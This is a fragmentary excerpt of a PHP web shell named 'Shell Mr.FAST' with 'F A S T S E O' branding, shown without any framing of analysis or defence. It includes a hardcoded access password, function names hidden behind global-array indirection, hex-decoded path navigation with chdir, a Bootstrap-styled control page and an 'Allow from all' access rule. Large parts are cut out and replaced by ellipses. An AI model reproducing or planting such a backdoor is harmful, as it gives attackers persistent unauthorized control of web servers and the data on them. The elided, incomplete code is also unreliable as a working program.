...
// $GLOBALS['fungsi'][0]
	...
	$gcw = "getcwd";
	$correctPassword = "jancokseo"; //Change Password
	if (isset($_POST['pass'])) {
	...
	<html>
	<head>
		<title>Shell Mr.FAST</title>
		<meta charset='UTF-8'>
		<meta name='author' content='F A S T S E O'>
	...
	<div class='py-3' id='main'>
		<div class='box shadow bg-dark p-4 rounded-3'>
			<a class='text-decoration-none text-light anu' href='".$_SERVER['PHP_SELF']."'><h4>F A S T S E O</h4></a>";
			if(isset($_7['path'])){
				$path = unhex($_7['path']);
				chdir($path);
			}else{
...
Allow from all
		...
		</div><div class='text-secondary'>&copy F A S T</div>
	</div>
</div>
</body>
</html>